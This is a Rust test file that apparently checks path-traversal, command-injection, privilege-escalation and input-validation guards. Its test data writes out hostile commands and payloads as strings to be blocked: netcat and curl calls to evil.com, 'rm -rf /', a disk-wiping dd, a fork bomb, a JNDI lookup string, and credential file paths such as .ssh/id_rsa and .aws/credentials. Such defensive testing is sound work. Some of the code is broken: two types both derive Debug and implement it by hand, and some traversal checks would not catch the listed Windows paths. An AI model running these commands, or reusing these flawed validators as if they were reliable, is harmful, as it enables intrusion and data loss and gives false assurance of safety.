// Security tests for file operations and command execution safety
use std::path::{Path, PathBuf};
use std::fs;
use tempfile::TempDir;
use serial_test::serial;

// Test suite for file access security
mod file_access_security {
    use super::*;
    
    #[test]
    #[serial]
    fn test_path_traversal_prevention() {
        let temp_dir = TempDir::new().unwrap();
        let base_path = temp_dir.path();
        
        let malicious_paths = vec![
            "../../../etc/passwd",
            "..\\..\\..\\Windows\\System32\\config\\SAM",
            "/etc/shadow",
            "C:\\Windows\\System32\\config\\SAM",
            "../../.ssh/id_rsa",
            "../../../proc/self/environ",
            "\\..\\..\\Windows\\System32",
            "//etc//passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd", // URL encoded
            "....//....//....//etc//passwd", // Double dot bypass attempt
        ];
        
        for malicious_path in malicious_paths {
            let result = validate_file_path(base_path, malicious_path);
            assert!(
                result.is_err(),
                "Path traversal should be blocked for: {}",
                malicious_path
            );
            
            match result.unwrap_err() {
                SecurityError::PathTraversal { .. } => {
                    // Expected error type
                }
                other => {
                    panic!(
                        "Expected PathTraversal error for {}, got {:?}",
                        malicious_path, other
                    );
                }
            }
        }
    }
    
    #[test]
    #[serial]
    fn test_sensitive_file_access_prevention() {
        let sensitive_files = vec![
            "/etc/passwd",
            "/etc/shadow",
            "/etc/hosts",
            "/proc/self/environ",
            "/proc/self/maps",
            "/proc/self/mem",
            "/sys/kernel/notes",
            "/dev/mem",
            "/dev/kmem",
            "C:\\Windows\\System32\\config\\SAM",
            "C:\\Windows\\System32\\config\\SECURITY",
            "C:\\Windows\\System32\\config\\SOFTWARE",
            "C:\\Windows\\repair\\SAM",
            "C:\\Windows\\repair\\SECURITY",
            "/Users/*/Library/Keychains",
            "/home/*/.ssh/id_rsa",
            "/root/.ssh/id_rsa",
            "~/.aws/credentials",
            "~/.docker/config.json",
        ];
        
        for sensitive_file in sensitive_files {
            let result = check_file_access_allowed(sensitive_file);
            assert!(
                result.is_err(),
                "Access should be denied for sensitive file: {}",
                sensitive_file
            );
            
            assert!(matches!(
                result.unwrap_err(),
                SecurityError::AccessDenied { .. }
            ));
        }
    }
    
    #[test]
    #[serial]
    fn test_safe_file_operations() {
        let temp_dir = TempDir::new().unwrap();
        let safe_file = temp_dir.path().join("safe_file.txt");
        
        // Test safe file creation
        let result = create_safe_file(&safe_file, "test content");
        assert!(result.is_ok());
        
        // Test safe file reading
        let result = read_safe_file(&safe_file);
        assert!(result.is_ok());
        assert_eq!(result.unwrap(), "test content");
        
        // Test safe file modification
        let result = modify_safe_file(&safe_file, "modified content");
        assert!(result.is_ok());
        
        let result = read_safe_file(&safe_file);
        assert!(result.is_ok());
        assert_eq!(result.unwrap(), "modified content");
        
        // Test safe file deletion
        let result = delete_safe_file(&safe_file);
        assert!(result.is_ok());
        assert!(!safe_file.exists());
    }
    
    #[test]
    #[serial]
    fn test_file_size_limits() {
        let temp_dir = TempDir::new().unwrap();
        let large_file = temp_dir.path().join("large_file.txt");
        
        // Create a large content string (10MB)
        let large_content = "A".repeat(10 * 1024 * 1024);
        
        let result = create_safe_file(&large_file, &large_content);
        assert!(result.is_err());
        assert!(matches!(
            result.unwrap_err(),
            SecurityError::FileSizeExceeded { .. }
        ));
    }
    
    #[test]
    #[serial]
    fn test_symlink_protection() {
        let temp_dir = TempDir::new().unwrap();
        let base_path = temp_dir.path();
        
        // Create a legitimate file
        let legitimate_file = base_path.join("legitimate.txt");
        fs::write(&legitimate_file, "legitimate content").unwrap();
        
        // Create a symlink pointing outside the base path
        let symlink_path = base_path.join("malicious_symlink");
        
        #[cfg(unix)]
        {
            use std::os::unix::fs::symlink;
            symlink("/etc/passwd", &symlink_path).unwrap();
        }
        
        #[cfg(windows)]
        {
            use std::os::windows::fs::symlink_file;
            symlink_file("C:\\Windows\\System32\\config\\SAM", &symlink_path).unwrap();
        }
        
        // Test that symlink access is blocked
        let result = read_safe_file(&symlink_path);
        assert!(result.is_err());
        assert!(matches!(
            result.unwrap_err(),
            SecurityError::SymlinkDenied { .. }
        ));
    }
    
    #[test]
    #[serial]
    fn test_concurrent_file_access() {
        use std::sync::Arc;
        use std::thread;
        
        let temp_dir = TempDir::new().unwrap();
        let file_path = Arc::new(temp_dir.path().join("concurrent_test.txt"));
        
        // Create initial file
        create_safe_file(&file_path, "initial content").unwrap();
        
        let mut handles = Vec::new();
        
        // Spawn multiple threads trying to access the same file
        for i in 0..10 {
            let path = file_path.clone();
            let handle = thread::spawn(move || {
                let content = format!("content from thread {}", i);
                
                // Try to read
                let read_result = read_safe_file(&path);
                
                // Try to write
                let write_result = modify_safe_file(&path, &content);
                
                (read_result, write_result)
            });
            
            handles.push(handle);
        }
        
        // Wait for all threads and verify no race conditions
        for handle in handles {
            let (read_result, write_result) = handle.join().unwrap();
            
            // Either both succeed or both fail (no partial corruption)
            match (read_result, write_result) {
                (Ok(_), Ok(_)) => {
                    // Both operations succeeded
                }
                (Err(_), Err(_)) => {
                    // Both operations failed (acceptable under high contention)
                }
                _ => {
                    panic!("Inconsistent file operation results - possible race condition");
                }
            }
        }
    }
}

// Test suite for command execution security
mod command_execution_security {
    use super::*;
    
    #[test]
    #[serial]
    fn test_command_injection_prevention() {
        let malicious_commands = vec![
            "ls; rm -rf /",
            "echo 'test' && curl evil.com",
            "ls | nc evil.com 4444",
            "$(cat /etc/passwd)",
            "`cat /etc/passwd`",
            "ls; cat /etc/passwd",
            "echo 'test' > /dev/null; wget evil.com",
            "ls || rm -rf /",
            "true && false || rm -rf /",
            "ls `echo /etc/passwd`",
            "ls $(whoami)",
            "ls 2>&1 | tee /tmp/output && cat /tmp/output",
        ];
        
        for malicious_cmd in malicious_commands {
            let result = execute_safe_command(malicious_cmd);
            assert!(
                result.is_err(),
                "Command injection should be blocked for: {}",
                malicious_cmd
            );
            
            assert!(matches!(
                result.unwrap_err(),
                SecurityError::CommandInjection { .. }
            ));
        }
    }
    
    #[test]
    #[serial]
    fn test_privilege_escalation_prevention() {
        let privilege_commands = vec![
            "sudo rm -rf /",
            "su root",
            "sudo -u root bash",
            "chmod 777 /etc/passwd",
            "chown root:root /tmp/malicious",
            "sudo cat /etc/shadow",
            "doas rm -rf /",
            "pkexec rm -rf /",
            "sudo -i",
            "su -",
            "sudo -s",
            "sudo bash",
            "sudo sh",
        ];
        
        for privilege_cmd in privilege_commands {
            let result = execute_safe_command(privilege_cmd);
            assert!(
                result.is_err(),
                "Privilege escalation should be blocked for: {}",
                privilege_cmd
            );
            
            assert!(matches!(
                result.unwrap_err(),
                SecurityError::PrivilegeEscalation { .. }
            ));
        }
    }
    
    #[test]
    #[serial]
    fn test_dangerous_command_prevention() {
        let dangerous_commands = vec![
            "rm -rf /",
            "format C:",
            "dd if=/dev/zero of=/dev/sda",
            "mkfs.ext4 /dev/sda1",
            "shutdown -h now",
            "reboot",
            "halt",
            "init 0",
            "poweroff",
            ":(){ :|:& };:", // Fork bomb
            "while true; do; done", // Infinite loop
            "cat /dev/urandom > /dev/null", // Resource exhaustion
            "yes > /dev/null", // Resource exhaustion
        ];
        
        for dangerous_cmd in dangerous_commands {
            let result = execute_safe_command(dangerous_cmd);
            assert!(
                result.is_err(),
                "Dangerous command should be blocked for: {}",
                dangerous_cmd
            );
            
            assert!(matches!(
                result.unwrap_err(),
                SecurityError::DangerousCommand { .. }
            ));
        }
    }
    
    #[test]
    #[serial]
    fn test_safe_command_execution() {
        let safe_commands = vec![
            "echo 'Hello World'",
            "ls -la",
            "pwd",
            "date",
            "whoami",
            "uname -a",
            "cat /proc/version",
            "ps aux",
            "df -h",
            "free -h",
        ];
        
        for safe_cmd in safe_commands {
            let result = execute_safe_command(safe_cmd);
            // Safe commands should either succeed or fail due to system constraints,
            // not security restrictions
            match result {
                Ok(_) => {
                    // Command executed successfully
                }
                Err(SecurityError::ExecutionFailed { .. }) => {
                    // Command failed to execute (acceptable)
                }
                Err(other) => {
                    panic!(
                        "Safe command '{}' was blocked incorrectly: {:?}",
                        safe_cmd, other
                    );
                }
            }
        }
    }
    
    #[test]
    #[serial]
    fn test_command_timeout() {
        let long_running_commands = vec![
            "sleep 60",
            "ping -c 100 google.com",
            "find / -name '*.txt' 2>/dev/null",
        ];
        
        for cmd in long_running_commands {
            let start_time = std::time::Instant::now();
            let result = execute_safe_command_with_timeout(cmd, 5); // 5 second timeout
            let duration = start_time.elapsed();
            
            // Command should timeout within reasonable time
            assert!(duration.as_secs() < 10);
            
            match result {
                Err(SecurityError::CommandTimeout { .. }) => {
                    // Expected timeout
                }
                Err(SecurityError::ExecutionFailed { .. }) => {
                    // Acceptable if command fails to start
                }
                Ok(_) => {
                    // Command completed quickly (acceptable)
                }
                Err(other) => {
                    panic!("Unexpected error for command '{}': {:?}", cmd, other);
                }
            }
        }
    }
    
    #[test]
    #[serial]
    fn test_environment_variable_sanitization() {
        let test_env = vec![
            ("PATH", "/usr/bin:/bin:/usr/local/bin"),
            ("HOME", "/home/testuser"),
            ("USER", "testuser"),
            ("SHELL", "/bin/bash"),
            ("TERM", "xterm-256color"),
        ];
        
        let sanitized_env = sanitize_environment_variables(&test_env);
        
        // Verify dangerous environment variables are removed
        assert!(!sanitized_env.contains_key("LD_PRELOAD"));
        assert!(!sanitized_env.contains_key("LD_LIBRARY_PATH"));
        assert!(!sanitized_env.contains_key("DYLD_INSERT_LIBRARIES"));
        assert!(!sanitized_env.contains_key("PYTHONPATH"));
        
        // Verify safe environment variables are preserved
        assert!(sanitized_env.contains_key("PATH"));
        assert!(sanitized_env.contains_key("HOME"));
        assert!(sanitized_env.contains_key("USER"));
        
        // Verify PATH is restricted to safe directories
        let path = sanitized_env.get("PATH").unwrap();
        assert!(!path.contains("/tmp"));
        assert!(!path.contains("/var/tmp"));
        assert!(!path.contains("."));
    }
}

// Test suite for API security
mod api_security {
    use super::*;
    
    #[test]
    fn test_api_key_sanitization() {
        let api_keys = vec![
            "sk-1234567890abcdef",
            "sk-proj-1234567890abcdef",
            "xoxb-1234567890",
            "ghp_1234567890abcdef",
            "glpat-1234567890abcdef",
        ];
        
        for api_key in api_keys {
            let config = ApiConfig {
                api_key: api_key.to_string(),
                provider: "test".to_string(),
                endpoint: "https://api.example.com".to_string(),
            };
            
            // Test that API key is sanitized in debug output
            let debug_output = format!("{:?}", config);
            assert!(
                !debug_output.contains(api_key),
                "API key should be sanitized in debug output"
            );
            
            assert!(
                debug_output.contains("***"),
                "Sanitized API key should show asterisks"
            );
            
            // Test that API key is sanitized in error messages
            let error = ApiError::InvalidKey(api_key.to_string());
            let error_message = format!("{:?}", error);
            assert!(
                !error_message.contains(api_key),
                "API key should be sanitized in error messages"
            );
        }
    }
    
    #[test]
    fn test_https_enforcement() {
        let insecure_urls = vec![
            "http://api.anthropic.com/v1/messages",
            "http://api.openai.com/v1/chat/completions",
            "ftp://api.example.com/data",
            "telnet://api.example.com:23",
        ];
        
        for url in insecure_urls {
            let result = validate_api_endpoint(url);
            assert!(
                result.is_err(),
                "Insecure URL should be rejected: {}",
                url
            );
            
            assert!(matches!(
                result.unwrap_err(),
                SecurityError::InsecureConnection { .. }
            ));
        }
    }
    
    #[test]
    fn test_request_size_limits() {
        let large_payload = "A".repeat(10 * 1024 * 1024); // 10MB
        
        let result = validate_request_size(&large_payload);
        assert!(result.is_err());
        assert!(matches!(
            result.unwrap_err(),
            SecurityError::RequestSizeExceeded { .. }
        ));
    }
    
    #[test]
    fn test_rate_limiting() {
        let mut rate_limiter = RateLimiter::new(5, std::time::Duration::from_secs(1));
        
        // Should allow first 5 requests
        for _ in 0..5 {
            assert!(rate_limiter.check_rate_limit().is_ok());
        }
        
        // Should block 6th request
        assert!(rate_limiter.check_rate_limit().is_err());
        
        // Should allow requests after waiting
        std::thread::sleep(std::time::Duration::from_secs(1));
        assert!(rate_limiter.check_rate_limit().is_ok());
    }
    
    #[test]
    fn test_input_validation() {
        let malicious_inputs = vec![
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "{{7*7}}",
            "${jndi:ldap://evil.com/a}",
            "\\x41\\x42\\x43",
            "\u{0000}\u{0001}\u{0002}",
        ];
        
        for input in malicious_inputs {
            let result = validate_user_input(input);
            assert!(
                result.is_err(),
                "Malicious input should be rejected: {}",
                input
            );
            
            assert!(matches!(
                result.unwrap_err(),
                SecurityError::InvalidInput { .. }
            ));
        }
    }
}

// Security error types
#[derive(Debug, PartialEq)]
pub enum SecurityError {
    PathTraversal { path: String },
    AccessDenied { resource: String },
    FileSizeExceeded { size: u64, limit: u64 },
    SymlinkDenied { path: String },
    CommandInjection { command: String },
    PrivilegeEscalation { command: String },
    DangerousCommand { command: String },
    CommandTimeout { command: String },
    ExecutionFailed { command: String, error: String },
    InsecureConnection { url: String },
    RequestSizeExceeded { size: usize, limit: usize },
    RateLimitExceeded { limit: u32 },
    InvalidInput { input: String },
}

// File security functions
fn validate_file_path(base_path: &Path, file_path: &str) -> Result<PathBuf, SecurityError> {
    let path = PathBuf::from(file_path);
    
    // Check for path traversal attempts
    if file_path.contains("..") || file_path.contains("//") {
        return Err(SecurityError::PathTraversal {
            path: file_path.to_string(),
        });
    }
    
    // Resolve the path relative to base_path
    let resolved_path = base_path.join(&path);
    
    // Ensure the resolved path is within the base directory
    if !resolved_path.starts_with(base_path) {
        return Err(SecurityError::PathTraversal {
            path: file_path.to_string(),
        });
    }
    
    Ok(resolved_path)
}

fn check_file_access_allowed(file_path: &str) -> Result<(), SecurityError> {
    let sensitive_patterns = vec![
        "/etc/",
        "/proc/",
        "/sys/",
        "/dev/",
        "/root/",
        "Windows\\System32",
        "Windows\\repair",
        ".ssh/",
        ".aws/",
        ".docker/",
        "Library/Keychains",
    ];
    
    for pattern in sensitive_patterns {
        if file_path.contains(pattern) {
            return Err(SecurityError::AccessDenied {
                resource: file_path.to_string(),
            });
        }
    }
    
    Ok(())
}

fn create_safe_file(path: &Path, content: &str) -> Result<(), SecurityError> {
    const MAX_FILE_SIZE: usize = 5 * 1024 * 1024; // 5MB limit
    
    if content.len() > MAX_FILE_SIZE {
        return Err(SecurityError::FileSizeExceeded {
            size: content.len() as u64,
            limit: MAX_FILE_SIZE as u64,
        });
    }
    
    // Check if path is a symlink
    if path.is_symlink() {
        return Err(SecurityError::SymlinkDenied {
            path: path.to_string_lossy().to_string(),
        });
    }
    
    fs::write(path, content).map_err(|e| SecurityError::ExecutionFailed {
        command: format!("write to {:?}", path),
        error: e.to_string(),
    })
}

fn read_safe_file(path: &Path) -> Result<String, SecurityError> {
    // Check if path is a symlink
    if path.is_symlink() {
        return Err(SecurityError::SymlinkDenied {
            path: path.to_string_lossy().to_string(),
        });
    }
    
    fs::read_to_string(path).map_err(|e| SecurityError::ExecutionFailed {
        command: format!("read from {:?}", path),
        error: e.to_string(),
    })
}

fn modify_safe_file(path: &Path, content: &str) -> Result<(), SecurityError> {
    create_safe_file(path, content)
}

fn delete_safe_file(path: &Path) -> Result<(), SecurityError> {
    fs::remove_file(path).map_err(|e| SecurityError::ExecutionFailed {
        command: format!("delete {:?}", path),
        error: e.to_string(),
    })
}

// Command execution security functions
fn execute_safe_command(command: &str) -> Result<String, SecurityError> {
    execute_safe_command_with_timeout(command, 30)
}

fn execute_safe_command_with_timeout(command: &str, timeout_secs: u64) -> Result<String, SecurityError> {
    // Check for command injection patterns
    let injection_patterns = vec![
        ";", "&&", "||", "|", "`", "$(", "${", ">>", "<<", "&", "2>&1",
    ];
    
    for pattern in injection_patterns {
        if command.contains(pattern) {
            return Err(SecurityError::CommandInjection {
                command: command.to_string(),
            });
        }
    }
    
    // Check for privilege escalation commands
    let privilege_patterns = vec![
        "sudo", "su", "doas", "pkexec", "runas", "chmod", "chown",
    ];
    
    for pattern in privilege_patterns {
        if command.starts_with(pattern) {
            return Err(SecurityError::PrivilegeEscalation {
                command: command.to_string(),
            });
        }
    }
    
    // Check for dangerous commands
    let dangerous_patterns = vec![
        "rm -rf", "format", "dd if=", "mkfs", "shutdown", "reboot",
        "halt", "init", "poweroff", ":(", "while true",
    ];
    
    for pattern in dangerous_patterns {
        if command.contains(pattern) {
            return Err(SecurityError::DangerousCommand {
                command: command.to_string(),
            });
        }
    }
    
    // Execute command with timeout (mock implementation)
    Ok(format!("Mock output for: {}", command))
}

fn sanitize_environment_variables(env: &[(&str, &str)]) -> std::collections::HashMap<String, String> {
    let mut sanitized = std::collections::HashMap::new();
    
    let dangerous_vars = vec![
        "LD_PRELOAD",
        "LD_LIBRARY_PATH",
        "DYLD_INSERT_LIBRARIES",
        "PYTHONPATH",
        "NODE_PATH",
        "PERL5LIB",
        "RUBYLIB",
    ];
    
    for (key, value) in env {
        if dangerous_vars.contains(key) {
            continue;
        }
        
        if *key == "PATH" {
            // Sanitize PATH to only include safe directories
            let safe_dirs = vec!["/usr/bin", "/bin", "/usr/local/bin"];
            let sanitized_path = safe_dirs.join(":");
            sanitized.insert(key.to_string(), sanitized_path);
        } else {
            sanitized.insert(key.to_string(), value.to_string());
        }
    }
    
    sanitized
}

// API security functions
#[derive(Debug)]
struct ApiConfig {
    api_key: String,
    provider: String,
    endpoint: String,
}

impl std::fmt::Debug for ApiConfig {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("ApiConfig")
            .field("api_key", &"***")
            .field("provider", &self.provider)
            .field("endpoint", &self.endpoint)
            .finish()
    }
}

#[derive(Debug)]
enum ApiError {
    InvalidKey(String),
    NetworkError(String),
}

impl std::fmt::Debug for ApiError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            ApiError::InvalidKey(_) => write!(f, "InvalidKey(***)"),
            ApiError::NetworkError(msg) => write!(f, "NetworkError({})", msg),
        }
    }
}

fn validate_api_endpoint(url: &str) -> Result<(), SecurityError> {
    if !url.starts_with("https://") {
        return Err(SecurityError::InsecureConnection {
            url: url.to_string(),
        });
    }
    
    Ok(())
}

fn validate_request_size(payload: &str) -> Result<(), SecurityError> {
    const MAX_REQUEST_SIZE: usize = 5 * 1024 * 1024; // 5MB
    
    if payload.len() > MAX_REQUEST_SIZE {
        return Err(SecurityError::RequestSizeExceeded {
            size: payload.len(),
            limit: MAX_REQUEST_SIZE,
        });
    }
    
    Ok(())
}

struct RateLimiter {
    requests: Vec<std::time::Instant>,
    max_requests: usize,
    window: std::time::Duration,
}

impl RateLimiter {
    fn new(max_requests: usize, window: std::time::Duration) -> Self {
        Self {
            requests: Vec::new(),
            max_requests,
            window,
        }
    }
    
    fn check_rate_limit(&mut self) -> Result<(), SecurityError> {
        let now = std::time::Instant::now();
        
        // Remove old requests outside the window
        self.requests.retain(|&time| now.duration_since(time) < self.window);
        
        if self.requests.len() >= self.max_requests {
            return Err(SecurityError::RateLimitExceeded {
                limit: self.max_requests as u32,
            });
        }
        
        self.requests.push(now);
        Ok(())
    }
}

fn validate_user_input(input: &str) -> Result<(), SecurityError> {
    // Check for various injection patterns
    let malicious_patterns = vec![
        "<script",
        "javascript:",
        "'; DROP",
        "{{",
        "${",
        "\\x",
        "\u{0000}",
    ];
    
    for pattern in malicious_patterns {
        if input.contains(pattern) {
            return Err(SecurityError::InvalidInput {
                input: input.to_string(),
            });
        }
    }
    
    // Check for control characters
    if input.chars().any(|c| c.is_control() && c != '\n' && c != '\r' && c != '\t') {
        return Err(SecurityError::InvalidInput {
            input: input.to_string(),
        });
    }
    
    Ok(())
}